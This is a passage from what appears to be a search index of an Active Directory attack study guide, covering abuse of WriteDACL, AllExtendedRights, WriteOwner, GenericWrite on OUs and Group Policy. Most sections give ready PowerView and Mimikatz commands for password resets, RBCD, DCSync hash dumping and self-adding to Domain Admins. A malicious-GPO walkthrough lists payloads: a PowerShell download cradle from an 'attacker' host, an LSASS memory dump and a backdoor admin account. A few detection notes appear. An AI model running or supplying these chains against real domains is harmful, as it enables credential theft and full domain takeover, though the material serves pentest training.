1: You have WriteDACL Step 2: Modify DACL Step 3: Grant yourself: GenericAll (full control) OR Specific rights (ForceChangePassword, AddMember, DCSync etc.) Step 4: Abuse newly gained privilege"},{"id":"object-wise-abuse-breakdown","u":"02_permissions-abuse.html#object-wise-abuse-breakdown","sec":"Permissions Abuse","lvl":3,"t":"🧩 4. Object-wise Abuse Breakdown","c":""},{"id":"a.-writedacl-on-user","u":"02_permissions-abuse.html#a.-writedacl-on-user","sec":"Permissions Abuse","lvl":4,"t":"👤 A. WriteDACL on USER","c":"🔐 What you control Permissions of user object ⚔️ What you do You grant yourself: GenericAll OR ForceChangePassword OR AllExtendedRights"},{"id":"abuse-outcomes","u":"02_permissions-abuse.html#abuse-outcomes","sec":"Permissions Abuse","lvl":4,"t":"💥 Abuse Outcomes","c":"1. Reset password (no creds needed) Take over account 2. Kerberoasting Add SPN → extract ticket → crack 3. Full takeover Modify attributes Persistence"},{"id":"summary-1","u":"02_permissions-abuse.html#summary-1","sec":"Permissions Abuse","lvl":4,"t":"🧠 Summary","c":"WriteDACL → GenericAll → User takeover → Lateral movement"},{"id":"b.-writedacl-on-group","u":"02_permissions-abuse.html#b.-writedacl-on-group","sec":"Permissions Abuse","lvl":4,"t":"👥 B. WriteDACL on GROUP","c":"🔐 What you control Membership control of group ⚔️ What you do Grant yourself: WriteMembers"},{"id":"abuse-outcomes-1","u":"02_permissions-abuse.html#abuse-outcomes-1","sec":"Permissions Abuse","lvl":4,"t":"💥 Abuse Outcomes","c":"1. Add yourself to group If group = Domain Admins → instant DA"},{"id":"summary-2","u":"02_permissions-abuse.html#summary-2","sec":"Permissions Abuse","lvl":4,"t":"🧠 Summary","c":"WriteDACL → AddMember → Privileged group → Privilege escalation"},{"id":"c.-writedacl-on-computer","u":"02_permissions-abuse.html#c.-writedacl-on-computer","sec":"Permissions Abuse","lvl":4,"t":"💻 C. WriteDACL on COMPUTER","c":"🔐 What you control Computer object permissions ⚔️ What you do Grant yourself: GenericAll"},{"id":"abuse-outcomes-2","u":"02_permissions-abuse.html#abuse-outcomes-2","sec":"Permissions Abuse","lvl":4,"t":"💥 Abuse Outcomes","c":"1. RBCD (Resource-Based Constrained Delegation) Impersonate users → SYSTEM access 2. Modify SPNs Kerberos abuse 3. Take machine control Pivot to domain"},{"id":"summary-3","u":"02_permissions-abuse.html#summary-3","sec":"Permissions Abuse","lvl":4,"t":"🧠 Summary","c":"WriteDACL → GenericAll → RBCD → SYSTEM → Domain pivot"},{"id":"d.-writedacl-on-ou-organizational-unit","u":"02_permissions-abuse.html#d.-writedacl-on-ou-organizational-unit","sec":"Permissions Abuse","lvl":4,"t":"🏢 D. WriteDACL on OU (Organizational Unit)","c":"🔐 What you control All objects inside OU (inherited permissions) ⚔️ What you do Grant yourself: GenericAll on OU (inheritable)"},{"id":"abuse-outcomes-3","u":"02_permissions-abuse.html#abuse-outcomes-3","sec":"Permissions Abuse","lvl":4,"t":"💥 Abuse Outcomes","c":"1. Control all users in OU Reset passwords Add SPNs 2. Control all computers RBCD attacks 3. Massive lateral movement"},{"id":"key-insight","u":"02_permissions-abuse.html#key-insight","sec":"Permissions Abuse","lvl":4,"t":"🧠 Key Insight","c":"👉 OU = multi-object attack surface WriteDACL → Inheritance → Control multiple objects → Scale attack"},{"id":"e.-writedacl-on-domain-most-critical","u":"02_permissions-abuse.html#e.-writedacl-on-domain-most-critical","sec":"Permissions Abuse","lvl":4,"t":"🌐 E. WriteDACL on DOMAIN (MOST CRITICAL)","c":"🔐 What you control Entire domain ACL ⚔️ What you do Grant yourself: DCSync rights: DS-Replication-Get-Changes DS-Replication-Get-Changes-All"},{"id":"abuse-outcomes-4","u":"02_permissions-abuse.html#abuse-outcomes-4","sec":"Permissions Abuse","lvl":3,"t":"💥 Abuse Outcomes","c":"🔥 DCSync Attack Dump password hashes of: Domain Admins KRBTGT Full domain compromise"},{"id":"summary-4","u":"02_permissions-abuse.html#summary-4","sec":"Permissions Abuse","lvl":4,"t":"🧠 Summary","c":"WriteDACL → Add DCSync rights → Dump hashes → Full domain takeover"},{"id":"why-writedacl-is-extremely-dangerous","u":"02_permissions-abuse.html#why-writedacl-is-extremely-dangerous","sec":"Permissions Abuse","lvl":4,"t":"⚠️ 5. Why WriteDACL is EXTREMELY Dangerous","c":"Works on ANY object Fully stealthy compared to exploits Doesn’t require admin initially Enables: Privilege escalation Lateral movement Persistence 👉 It’s a meta-permission (controls other permissions)"},{"id":"detection-alerts-very-important","u":"02_permissions-abuse.html#detection-alerts-very-important","sec":"Permissions Abuse","lvl":4,"t":"🚨 6. Detection & Alerts (Very Important)","c":"🔍 What to Monitor 1. ACL Changes Attribute: nTSecurityDescriptor Any change = suspicious 2. WriteDACL Usage Events Windows Event IDs: 4662 → Object permission change 5136 → Directory object modified 3. Suspicious Patterns New ACE granting: GenericAll WriteDACL DCSync rights"},{"id":"final-mental-model-important","u":"02_permissions-abuse.html#final-mental-model-important","sec":"Permissions Abuse","lvl":4,"t":"🧠 FINAL MENTAL MODEL (IMPORTANT)","c":"Think like this: WriteDACL = Permission Editor Access If you can edit permissions → You can give yourself power → You become owner/control entity"},{"id":"quick-comparison-table","u":"02_permissions-abuse.html#quick-comparison-table","sec":"Permissions Abuse","lvl":4,"t":"🔥 Quick Comparison Table","c":"Object | What you gain | Final Impact | — | — | — | User | Reset password / full control | Account takeover | Group | Add yourself | Privilege escalation | Computer | RBCD / control | SYSTEM / pivot | OU | Control many objects | Large-scale takeover | Domain | DCSync | Full domain compromise |"},{"id":"all-extended-rights","u":"02_permissions-abuse.html#all-extended-rights","sec":"Permissions Abuse","lvl":2,"t":"All Extended Rights","c":""},{"id":"definition","u":"02_permissions-abuse.html#definition","sec":"Permissions Abuse","lvl":4,"t":"📌 1. Definition","c":"AllExtendedRights in Active Directory: 👉 Grants permission to perform all extended (special) operations on an object."},{"id":"extended-rights-special-actions","u":"02_permissions-abuse.html#extended-rights-special-actions","sec":"Permissions Abuse","lvl":4,"t":"🧠 Extended Rights = Special Actions","c":"Not full control, but powerful operations like: Reset password Replication (DCSync) Delegation-related actions Authentication permissions 🔥 Core Idea AllExtendedRights = Perform critical privileged actions WITHOUT full write access"},{"id":"conditions-for-abuse-3","u":"02_permissions-abuse.html#conditions-for-abuse-3","sec":"Permissions Abuse","lvl":4,"t":"⚠️ 2. Conditions for Abuse","c":"✅ General Conditions You must have AllExtendedRights on the target object Network access to Domain Controller Target object not blocking required operation (edge cases) ⚠️ Special Conditions (Important) Target | Extra Requirement | — | — | User | Not protected by AdminSDHolder (sometimes) | Computer | Need attacker-controlled machine/SPN | Domain | Must apply on domain root object | OU | Not useful (no strong extended rights) |"},{"id":"user-object","u":"02_permissions-abuse.html#user-object","sec":"Permissions Abuse","lvl":4,"t":"👤 USER Object","c":"🎯 What you can do 👉 Reset password"},{"id":"attack-flow-1","u":"02_permissions-abuse.html#attack-flow-1","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack Flow","c":"AllExtendedRights → Reset Password → Account Takeover"},{"id":"command","u":"02_permissions-abuse.html#command","sec":"Permissions Abuse","lvl":4,"t":"💻 Command","c":"Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force)"},{"id":"impact","u":"02_permissions-abuse.html#impact","sec":"Permissions Abuse","lvl":4,"t":"💥 Impact","c":"Full user access Privilege escalation (if privileged user)"},{"id":"computer-object","u":"02_permissions-abuse.html#computer-object","sec":"Permissions Abuse","lvl":4,"t":"💻 COMPUTER Object","c":"🎯 What you can do 👉 Read Laps Password You may read the LAPS password of the computer object. For more information about that, see the ReadLAPSPassword edge section. 👉 RBCD (Resource-Based Constrained Delegation)"},{"id":"attack-flow-2","u":"02_permissions-abuse.html#attack-flow-2","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack Flow","c":"AllExtendedRights → Set msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD → SYSTEM"},{"id":"command-1","u":"02_permissions-abuse.html#command-1","sec":"Permissions Abuse","lvl":4,"t":"💻 Command","c":"Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$attackerSID}"},{"id":"impact-1","u":"02_permissions-abuse.html#impact-1","sec":"Permissions Abuse","lvl":4,"t":"💥 Impact","c":"SYSTEM access on target machine Lateral movement"},{"id":"domain-object","u":"02_permissions-abuse.html#domain-object","sec":"Permissions Abuse","lvl":4,"t":"🌐 DOMAIN Object","c":""},{"id":"what-is-a-domain-object","u":"02_permissions-abuse.html#what-is-a-domain-object","sec":"Permissions Abuse","lvl":4,"t":"🧠 What is a “Domain Object”?","c":"In Active Directory: 👉 A domain object refers to the root object of the domain itself , not users, computers, or OUs. 📌 Example For a domain: domain.local The domain object is: DC=domain,DC=local"},{"id":"think-of-ad-hierarchy-like-this","u":"02_permissions-abuse.html#think-of-ad-hierarchy-like-this","sec":"Permissions Abuse","lvl":4,"t":"🧩 Think of AD hierarchy like this:","c":"DC=domain,DC=local ← 🌐 DOMAIN OBJECT (this is what we mean) │ ├── OU=IT │ ├── user1 │ └── computer1 │ ├── OU=HR │ └── user2"},{"id":"key-understanding-1","u":"02_permissions-abuse.html#key-understanding-1","sec":"Permissions Abuse","lvl":4,"t":"🔥 Key Understanding","c":"Term | Meaning | — | — | Domain | Logical network (domain.local) | Domain Object | The AD object representing the domain | Distinguished Name | DC=domain,DC=local | 🎯 What you can do 👉 DCSync attack 🎯 What you want to see attacker ──AllExtendedRights──▶ domain.local"},{"id":"attack-flow-3","u":"02_permissions-abuse.html#attack-flow-3","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack Flow","c":"AllExtendedRights → Replication Rights → DCSync → Dump hashes → Domain Compromise"},{"id":"command-mimikatz","u":"02_permissions-abuse.html#command-mimikatz","sec":"Permissions Abuse","lvl":4,"t":"💻 Command (Mimikatz)","c":"lsadump::dcsync/domain:domain.local/user:Administrator"},{"id":"impact-2","u":"02_permissions-abuse.html#impact-2","sec":"Permissions Abuse","lvl":4,"t":"💥 Impact","c":"Dump NTLM hashes of all users Full domain compromise"},{"id":"write-owner","u":"02_permissions-abuse.html#write-owner","sec":"Permissions Abuse","lvl":2,"t":"Write Owner","c":"📌 1. Definition WriteOwner in Active Directory allows you to: 👉 Change the owner of an object (user, group, computer, OU) 🧠 Why ownership matters In AD: Owner → has implicit right to modify ACL (DACL) 👉 Even if you don’t have GenericAll , as owner you can: Modify permissions Grant yourself full control 🔥 Core Idea WriteOwner → Take Ownership → Modify ACL → Full Control → Abuse"},{"id":"abuse-flow-generic","u":"02_permissions-abuse.html#abuse-flow-generic","sec":"Permissions Abuse","lvl":4,"t":"⚔️ 2. Abuse Flow (Generic)","c":"Step 1 — Take ownership Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker Step 2 — Grant yourself full control Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -RightsAll Step 3 — Abuse based on object type"},{"id":"writeowner-on-user","u":"02_permissions-abuse.html#writeowner-on-user","sec":"Permissions Abuse","lvl":4,"t":"🧩 3. WriteOwner on USER","c":"📌 What you get After abuse: Reset password Add SPN (Kerberoasting) Shadow credentials Account takeover"},{"id":"example-attack","u":"02_permissions-abuse.html#example-attack","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Example Attack","c":"Step 1 — Take ownership Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker Step 2 — Full control Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsAll Step 3 — Reset password Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force)"},{"id":"result-1","u":"02_permissions-abuse.html#result-1","sec":"Permissions Abuse","lvl":4,"t":"🎯 Result","c":"👉 Full account takeover ✅ Conditions WriteOwner on user Target not protected (or still modifiable) You can reach DC"},{"id":"writeowner-on-computer","u":"02_permissions-abuse.html#writeowner-on-computer","sec":"Permissions Abuse","lvl":4,"t":"💻 4. WriteOwner on COMPUTER","c":"📌 What you get After abuse: Modify attributes Set delegation (RBCD) Control machine account"},{"id":"example-attack-rbcd-path","u":"02_permissions-abuse.html#example-attack-rbcd-path","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Example Attack (RBCD path)","c":"Step 1 — Take ownership Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker Step 2 — Full control Add-DomainObjectAcl -TargetIdentity TARGET$ -PrincipalIdentity attacker -RightsAll Step 3 — Set RBCD Set-DomainObject-IdentityTARGET$-Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$attackerSID} 🎯 Result 👉 SYSTEM access on target machine ✅ Conditions WriteOwner on computer Ability to create/control attacker machine (SPN) Kerberos abuse possible"},{"id":"writeowner-on-group","u":"02_permissions-abuse.html#writeowner-on-group","sec":"Permissions Abuse","lvl":4,"t":"👥 5. WriteOwner on GROUP","c":"📌 What you get Add members to group Full control over group"},{"id":"example-attack-1","u":"02_permissions-abuse.html#example-attack-1","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Example Attack","c":"Step 1 — Take ownership Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker Step 2 — Full control Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -PrincipalIdentity attacker -RightsAll Step 3 — Add yourself Add-DomainGroupMember -Identity \"Domain Admins\" -Members attacker"},{"id":"result-2","u":"02_permissions-abuse.html#result-2","sec":"Permissions Abuse","lvl":4,"t":"🎯 Result","c":"👉 Domain Admin access"},{"id":"note","u":"02_permissions-abuse.html#note","sec":"Permissions Abuse","lvl":4,"t":"⚠️ Note","c":"High-value target Likely monitored"},{"id":"conditions","u":"02_permissions-abuse.html#conditions","sec":"Permissions Abuse","lvl":4,"t":"✅ Conditions","c":"WriteOwner on group Group not protected OR ACL still modifiable"},{"id":"writeowner-on-ou","u":"02_permissions-abuse.html#writeowner-on-ou","sec":"Permissions Abuse","lvl":4,"t":"🏢 6. WriteOwner on OU","c":"📌 What you get Control over OU ACL Ability to push permissions to child objects"},{"id":"example-attack-2","u":"02_permissions-abuse.html#example-attack-2","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Example Attack","c":"Step 1 — Take ownership Set-DomainObjectOwner -Identity \"OU=IT,DC=domain,DC=local\"-OwnerIdentityattacker Step 2 — Full control Add-DomainObjectAcl-TargetIdentity\"OU=IT,DC=domain,DC=local\"-PrincipalIdentityattacker-RightsAll Step 3 — Push inherited control Add-DomainObjectAcl ` -TargetIdentity\"OU=IT,DC=domain,DC=local\" ` -PrincipalIdentityattacker ` -RightsAll ` -InheritanceTypeDescendents ` -TargetTypeUser 🎯 Result 👉 Control over: Users Computers inside OU 💥 Follow-up attacks Reset passwords RBCD on computers Group abuse ✅ Conditions WriteOwner on OU Inheritance enabled on child objects"},{"id":"summary-table-2","u":"02_permissions-abuse.html#summary-table-2","sec":"Permissions Abuse","lvl":4,"t":"🔥 7. Summary Table","c":"Target | What you gain | Final impact | — | — | — | User | Full control | Account takeover | Computer | Delegation control | SYSTEM access | Group | Membership control | Privilege escalation | OU | Control over children | Mass compromise |"},{"id":"key-differences-vs-genericall","u":"02_permissions-abuse.html#key-differences-vs-genericall","sec":"Permissions Abuse","lvl":4,"t":"🧠 8. Key Differences vs GenericAll","c":"Right | Capability | — | — | GenericAll | Direct full control | WriteOwner | Indirect → must escalate via ACL |"},{"id":"one-line-takeaway","u":"02_permissions-abuse.html#one-line-takeaway","sec":"Permissions Abuse","lvl":4,"t":"🧠 9. One-line Takeaway","c":"👉 WriteOwner is a privilege escalation primitive — not direct control, but a stepping stone to full compromise."},{"id":"ou-abuse","u":"02_permissions-abuse.html#ou-abuse","sec":"Permissions Abuse","lvl":2,"t":"OU Abuse","c":"INHERITANCE CHAIN: ┌──────────────────────────────────────────────────────────────┐ │ EXPLICIT PERMISSIONS ON OU │ │ (What you directly assign to OU) │ └──────────────────┬───────────────────────────────────────────┘ │ ├─ Apply to OU itself │ ├─ INHERIT DOWN (unless blocked) │ ├─ Child OUs │ ├─ Computers │ ├─ Users │ ├─ Groups │ └─ Other objects │ └─ Inheritance Type: ├─ \"This object and all descendant objects\" │ (DEFAULT - most permissive) │ ├─ \"This object only\" │ (NO inheritance) │ └─ \"All descendant objects\" (Child objects only, not OU itself) Key Rule: Unless an OU has “ Protect from inheritance ” enabled, ALL permissions granted on parent OU flow down to children automatically."},{"id":"generic-rights","u":"02_permissions-abuse.html#generic-rights","sec":"Permissions Abuse","lvl":3,"t":"GENERIC RIGHTS","c":""},{"id":"a.-genericall-full-control","u":"02_permissions-abuse.html#a.-genericall-full-control","sec":"Permissions Abuse","lvl":4,"t":"1A. GenericAll (Full Control)","c":"OU-Level Permission: Grants: All operations on the OU object itself - Read all properties - Modify all properties - Delete the OU - Change permissions - Change owner - Create child objects Inheritance to Child Objects: ✓ YES - ALL children inherit GenericAll ├─ Computers → Can reset passwords, modify all properties ├─ Users → Can reset passwords, modify all properties ├─ Groups → Can modify membership, properties └─ Child OUs → Full control of child OUs recursively Affected Objects: ✓ All users in OU and child OUs ✓ All computers in OU and child OUs ✓ All groups in OU and child OUs ✓ All child OUs (recursively)"},{"id":"b.-genericread","u":"02_permissions-abuse.html#b.-genericread","sec":"Permissions Abuse","lvl":4,"t":"1B. GenericRead","c":"OU-Level Permission: Grants: Read all properties on OU - Cannot modify - Cannot delete - Cannot create Inheritance to Child Objects: ✓ YES - Children inherit read rights ├─ Can read all properties of users/computers/groups ├─ Can enumerate OU contents └─ Cannot modify anything Affected Objects: ✓ Can read all user properties ✓ Can read all computer properties ✓ Can read all group properties ✓ Can enumerate memberships"},{"id":"property-specific-write-rights","u":"02_permissions-abuse.html#property-specific-write-rights","sec":"Permissions Abuse","lvl":4,"t":"2. PROPERTY-SPECIFIC WRITE RIGHTS","c":""},{"id":"a.-genericwrite","u":"02_permissions-abuse.html#a.-genericwrite","sec":"Permissions Abuse","lvl":4,"t":"2A. GenericWrite","c":"OU-Level Permission: Grants: Write all non-schema properties - Modify all non-system attributes - Cannot reset passwords directly - Cannot modify permissions (needs WriteDacl) Inheritance to Child Objects: ✓ YES - ALL children inherit GenericWrite ├─ Users → Modify scriptPath, homeDirectory, etc. ├─ Computers → Modify delegated rights, DNS names ├─ Groups → Modify descriptions, managedBy └─ Child OUs → Modify properties Affected Objects: ✓ All users in OU ✓ All computers in OU ✓ All groups in OU ✓ All child OUs"},{"id":"b.-writeproperty-specific-attribute","u":"02_permissions-abuse.html#b.-writeproperty-specific-attribute","sec":"Permissions Abuse","lvl":4,"t":"2B. WriteProperty (Specific Attribute)","c":"OU-Level Permission: Grants: Write to specific attributes only (e.g., mail, telephone) - Very granular permission - Inheritance depends on what property Inheritance to Child Objects: ✓ YES - Inheritance applies to the specific property ├─ Can write that property on all children ├─ Cannot write other properties └─ If property is \"scriptPath\" → RCE"},{"id":"deferential-rights-change-control-ownership","u":"02_permissions-abuse.html#deferential-rights-change-control-ownership","sec":"Permissions Abuse","lvl":3,"t":"3. DEFERENTIAL RIGHTS (Change Control & Ownership)","c":""},{"id":"a.-writedacl-modify-permissions","u":"02_permissions-abuse.html#a.-writedacl-modify-permissions","sec":"Permissions Abuse","lvl":4,"t":"3A. WriteDacl (Modify Permissions)","c":"OU-Level Permission: Grants: Modify the ACL on the OU - Add/remove permissions - Grant yourself Full Control - Grant others permissions Inheritance to Child Objects: ✓ YES - Can modify ACLs on all children ├─ Users → Grant yourself Reset Password right ├─ Computers → Grant yourself Full Control ├─ Groups → Grant yourself modify right └─ Child OUs → Modify their ACLs recursively Affected Objects: ✓ All users (grant yourself reset password) ✓ All computers (grant yourself full control) ✓ All groups (grant yourself modify membership) ✓ All child OUs (recursive ACL modification)"},{"id":"b.-writeowner-change-owner","u":"02_permissions-abuse.html#b.-writeowner-change-owner","sec":"Permissions Abuse","lvl":4,"t":"3B. WriteOwner (Change Owner)","c":"OU-Level Permission: Grants: Change the owner of the OU - Owner has implicit Full Control - Change owner to yourself → Full Control Inheritance to Child Objects: ✓ YES - Can change owner of all children ├─ Users → Become owner → Full Control ├─ Computers → Become owner → Full Control ├─ Groups → Become owner → Full Control └─ Child OUs → Become owner → Full Control recursively Affected Objects: ✓ All users in OU ✓ All computers in OU ✓ All groups in OU ✓ All child OUs"},{"id":"object-creation-deletion-rights","u":"02_permissions-abuse.html#object-creation-deletion-rights","sec":"Permissions Abuse","lvl":3,"t":"4. OBJECT CREATION & DELETION RIGHTS","c":""},{"id":"a.-createchild","u":"02_permissions-abuse.html#a.-createchild","sec":"Permissions Abuse","lvl":4,"t":"4A. CreateChild","c":"OU-Level Permission: Grants: Create child objects in the OU - Can create users, computers, groups - Cannot modify existing objects Inheritance to Child Objects: ✓ YES (in a specific way) - Can create children inside child OUs ├─ OU level: Can create objects in this OU ├─ Child OUs: Can create objects inside child OUs └─ Inheritance type: \"This object and all descendant objects\" Affected Objects: ✓ Can create anywhere in OU and child OUs ✓ Creates can be given arbitrary properties/memberships ✓ No restrictions on what you create"},{"id":"extended-rights-special-capabilities","u":"02_permissions-abuse.html#extended-rights-special-capabilities","sec":"Permissions Abuse","lvl":3,"t":"5. EXTENDED RIGHTS (Special Capabilities)","c":""},{"id":"a.-extendedright---reset-password","u":"02_permissions-abuse.html#a.-extendedright---reset-password","sec":"Permissions Abuse","lvl":4,"t":"5A. ExtendedRight - Reset Password","c":"OU-Level Permission: Grants: Reset passwords for all users in OU - Can set new password - User doesn't need to know old password - Requires explicit Extended Right GUID GUID: 00299570-246d-11d0-a768-00aa006e0529 Inheritance to Child Objects: ✓ YES - Can reset passwords on all children ├─ Users in OU → Password reset ├─ Users in child OUs → Password reset └─ Non-inherited: Doesn't apply to computers/groups Affected Objects: ✓ All users in OU and child OUs ✗ Does NOT affect computers or groups directly"},{"id":"b.-extendedright---force-change-password","u":"02_permissions-abuse.html#b.-extendedright---force-change-password","sec":"Permissions Abuse","lvl":4,"t":"5B. ExtendedRight - Force Change Password","c":"OU-Level Permission: Grants: Force user to change password at next logon - User can't use account until password changed - Attacker doesn't know the new password - Used for DoS or forcing re-authentication GUID: 00299570-246d-11d0-a768-00aa006e0529 (combined with Reset)"},{"id":"c.-extendedright---sendto","u":"02_permissions-abuse.html#c.-extendedright---sendto","sec":"Permissions Abuse","lvl":4,"t":"5C. ExtendedRight - SendTo","c":"OU-Level Permission: Grants: Send messages to the object (Exchange-related) - Rarely used in pure AD - More relevant in Exchange environments"},{"id":"d.-extendedright---addremove-self-as-member","u":"02_permissions-abuse.html#d.-extendedright---addremove-self-as-member","sec":"Permissions Abuse","lvl":4,"t":"5D. ExtendedRight - Add/Remove Self as Member","c":"OU-Level Permission: Grants: Add yourself to groups in OU - Can self-add to any group"},{"id":"genericall-write-on-ou","u":"02_permissions-abuse.html#genericall-write-on-ou","sec":"Permissions Abuse","lvl":2,"t":"GenericAll / Write on OU","c":""},{"id":"what-genericwrite-on-ou-actually-means","u":"02_permissions-abuse.html#what-genericwrite-on-ou-actually-means","sec":"Permissions Abuse","lvl":3,"t":"🧠 1. What GenericWrite on OU Actually Means","c":"🔐 GenericWrite = Attribute-level control You cannot fully control the OU But you can modify specific attributes of the OU 👉 One critical attribute: gPLink GPO ├── GPC (AD Object) └── GPT (SYSVOL Files)"},{"id":"what-is-gplink","u":"02_permissions-abuse.html#what-is-gplink","sec":"Permissions Abuse","lvl":3,"t":"🧠 2. What is gPLink?","c":"📌 Definition gPLink = attribute that defines which GPOs are linked to an OU OU doesn’t directly enforce policies It links to GPOs , and those GPOs apply to: Users inside OU Computers inside OU 🧠 Mental Model OU → (gPLink) → GPO → Applies to → Users & Computers 👉 So if you control gPLink , you control what policies apply"},{"id":"why-genericwrite-on-ou-is-dangerous","u":"02_permissions-abuse.html#why-genericwrite-on-ou-is-dangerous","sec":"Permissions Abuse","lvl":3,"t":"🔥 3. Why GenericWrite on OU is Dangerous","c":"Even without full control: 👉 If you can modify gPLink → You can attach a malicious GPO → That GPO executes actions on all child objects"},{"id":"scenario-genericwrite-on-ou-gplink-abuse","u":"02_permissions-abuse.html#scenario-genericwrite-on-ou-gplink-abuse","sec":"Permissions Abuse","lvl":3,"t":"💻 🧪 Scenario: GenericWrite on OU → gPLink Abuse","c":"🎯 Lab Setup Attacker user: attacker Target OU: OU=IT,DC=domain,DC=local Inside OU: Users: john , admin1 Computers: IT-PC01 👉 You have: GenericWrite → OU=IT 🧠 Attack Goal Abuse gPLink → Link malicious GPO → Execute code on all OU machines"},{"id":"step-1-verify-access-bloodhound-powerview","u":"02_permissions-abuse.html#step-1-verify-access-bloodhound-powerview","sec":"Permissions Abuse","lvl":3,"t":"⚔️ Step 1: Verify Access (BloodHound / PowerView)","c":"PowerView check: Get-ObjectAcl -Identity \"OU=IT,DC=domain,DC=local\" -ResolveGUIDs 🔍 Output (snippet): IdentityReference : DOMAIN\\attacker ActiveDirectoryRights : GenericWrite ObjectDN : OU=IT,DC=domain,DC=local ✅ Confirms you can modify OU attributes (including gPLink )"},{"id":"step-2-create-malicious-gpo","u":"02_permissions-abuse.html#step-2-create-malicious-gpo","sec":"Permissions Abuse","lvl":3,"t":"⚔️ Step 2: Create Malicious GPO","c":"New-GPO -Name \"evilGPO\" ✔ Output: DisplayName : evilGPO Id : 6f3c1b44-9d8e-4b1c-92c2-123456789abc GpoStatus : AllSettingsEnabled"},{"id":"step-3-modify-gpo-to-execute-payload","u":"02_permissions-abuse.html#step-3-modify-gpo-to-execute-payload","sec":"Permissions Abuse","lvl":3,"t":"⚔️ Step 3: Modify GPO to Execute Payload","c":"Example: Add startup script Set -GPStartupScript -Name \"evilGPO\" -ScriptName \"shell.bat\" -ScriptParameters\"\" Example payload ( shell.bat ) net localgroup administrators attacker /add 👉 Effect: Any machine in OU → attacker becomes local admin"},{"id":"step-4-link-gpo-to-ou-gplink-abuse","u":"02_permissions-abuse.html#step-4-link-gpo-to-ou-gplink-abuse","sec":"Permissions Abuse","lvl":3,"t":"⚔️ Step 4: Link GPO to OU (gPLink Abuse)","c":"New-GPLink -Name \"evilGPO\" -Target \"OU=IT,DC=domain,DC=local\" 🔍 What happens internally: gPLink attribute updated: [LDAP://CN={GPO-GUID},CN=Policies,CN=System,...]"},{"id":"step-5-wait-for-policy-application","u":"02_permissions-abuse.html#step-5-wait-for-policy-application","sec":"Permissions Abuse","lvl":3,"t":"⚔️ Step 5: Wait for Policy Application","c":"Force update (if you have access): gpupdate/force 🖥️ On victim machine: whoami /groups ✔ Output: BUILTIN\\Administrators DOMAIN\\attacker 🔥 You are now local admin on all machines in OU"},{"id":"alternate-payloads","u":"02_permissions-abuse.html#alternate-payloads","sec":"Permissions Abuse","lvl":3,"t":"💥 Alternate Payloads","c":"🎯 1. Reverse Shell powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')\" 🎯 2. Dump Credentials rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\lsass.dmp full 🎯 3. Persistence net user backdoor Pass@123 /add net localgroup administrators backdoor /add"},{"id":"step-6-domain-escalation-path","u":"02_permissions-abuse.html#step-6-domain-escalation-path","sec":"Permissions Abuse","lvl":3,"t":"🔄 Step 6: Domain Escalation Path","c":"Once you get local admin: Local Admin → Dump creds → Lateral movement → Domain Admin"},{"id":"real-attack-chain","u":"02_permissions-abuse.html#real-attack-chain","sec":"Permissions Abuse","lvl":3,"t":"🧠 Real Attack Chain","c":"GenericWrite (OU) ↓ Modify gPLink ↓ Link malicious GPO ↓ Code execution on machines ↓ Local admin access ↓ Credential dump ↓ Domain compromise"},{"id":"detection-example","u":"02_permissions-abuse.html#detection-example","sec":"Permissions Abuse","lvl":3,"t":"🚨 Detection Example","c":""},{"id":"event-id-5136-directory-change","u":"02_permissions-abuse.html#event-id-5136-directory-change","sec":"Permissions Abuse","lvl":4,"t":"🔍 Event ID 5136 (Directory Change)","c":"Attribute Modified: gPLink Object: OU=IT,DC=domain,DC=local"},{"id":"gpo-link-event","u":"02_permissions-abuse.html#gpo-link-event","sec":"Permissions Abuse","lvl":4,"t":"🔍 GPO Link Event","c":"New GPO linked: evilGPO Target: OU=IT"},{"id":"endpoint-alert","u":"02_permissions-abuse.html#endpoint-alert","sec":"Permissions Abuse","lvl":4,"t":"🔍 Endpoint Alert","c":"Multiple machines executing: net localgroup administrators attacker /add"},{"id":"key-takeaway-2","u":"02_permissions-abuse.html#key-takeaway-2","sec":"Permissions Abuse","lvl":3,"t":"🧠 Key Takeaway","c":"You didn’t exploit machines directly. You modified policy → Policy executed for you → Machines compromised themselves."},{"id":"clean-one-liner","u":"02_permissions-abuse.html#clean-one-liner","sec":"Permissions Abuse","lvl":3,"t":"🔥 Clean One-Liner","c":"GenericWrite on OU → control gPLink → push malicious GPO → mass compromise"},{"id":"gpo-abuse","u":"02_permissions-abuse.html#gpo-abuse","sec":"Permissions Abuse","lvl":2,"t":"GPO Abuse","c":""},{"id":"understanding-the-core-concept","u":"02_permissions-abuse.html#understanding-the-core-concept","sec":"Permissions Abuse","lvl":3,"t":"Understanding The Core Concept","c":""},{"id":"group-policy-in-active-directory-ad","u":"02_permissions-abuse.html#group-policy-in-active-directory-ad","sec":"Permissions Abuse","lvl":4,"t":"🔐 Group Policy in Active Directory (AD)","c":"In a Windows domain environment, Group Policy is a framework for centralized management and configuration of operating systems, applications, and user settings. Instead of having to manually configure each machine or user account, you define settings once, and AD pushes them out automatically. Think of it like a remote control panel for every domain-joined computer and user in your organization."},{"id":"scope-of-group-policy","u":"02_permissions-abuse.html#scope-of-group-policy","sec":"Permissions Abuse","lvl":4,"t":"2. Scope of Group Policy","c":"Group Policy settings apply either to computers or to users — but not both at the same time for a single policy setting. Target | Examples of Settings | — | — 